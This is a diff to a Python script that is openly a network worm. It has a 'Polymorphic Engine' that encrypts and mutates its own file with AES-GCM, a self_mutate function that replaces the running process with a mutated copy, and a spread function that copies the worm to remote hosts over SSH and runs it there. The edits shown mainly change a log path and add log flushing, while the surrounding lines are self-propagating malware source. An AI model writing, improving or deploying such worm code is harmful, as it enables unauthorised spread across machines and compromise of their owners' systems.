@@ -75,7 +75,7 @@ console_handler.setLevel(logging.INFO)
 console_handler.setFormatter(ColorizedFormatter())
 logger.addHandler(console_handler)
 
-file_handler = logging.FileHandler(filename='/tmp/default/dmsg.log')
+file_handler = logging.FileHandler(filename='/tmp/dmsg.log')
 file_handler.setLevel(logging.DEBUG)
 file_formatter = logging.Formatter('%(asctime)s - %(message)s')
 file_handler.setFormatter(file_formatter)
@@ -93,6 +93,7 @@ MIN_SUBNET_MASK = 24
 ########################################
 # Polymorphic Engine (AES-GCM Functions)
 ########################################
+
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
@@ -157,6 +158,7 @@ def polymorph_file(file_path):
 ###########################################
 # Worm Core (Network Propagation Functions)
 ###########################################
+
 MAX_MUTATIONS = 2       # Maximum allowed self-mutations per machine
 home_path = f"/home/{os.getlogin()}"
 
@@ -249,7 +251,10 @@ def self_mutate():
     mutated_file_path = os.path.join(os.path.dirname(current_file), mutated_file)
     os.chmod(mutated_file_path, 0o755)
     logger.info(f"Self-mutation complete. New worm file: {mutated_file_path}")
+    
     # Replace the current process with the new mutated worm, passing the updated environment.
+    for handler in logger.handlers:
+        handler.flush()
     os.execv(mutated_file_path, sys.argv)
 
 def local_addresses():
@@ -404,6 +409,10 @@ def spread(ssh):
     logger.error("Remote worm deployed. Executing worm via SSH...")
     t = threading.Thread(target=exec_remote_command, args=(ssh, f"(cd {REMOTE_DIR}; python3 {mutated_file})"))
     t.start()
+
+    # Flush logs and exit
+    for handler in logger.handlers:
+        handler.flush()
     sys.exit(0)
 
 def check_remote_infection_marker(ssh):
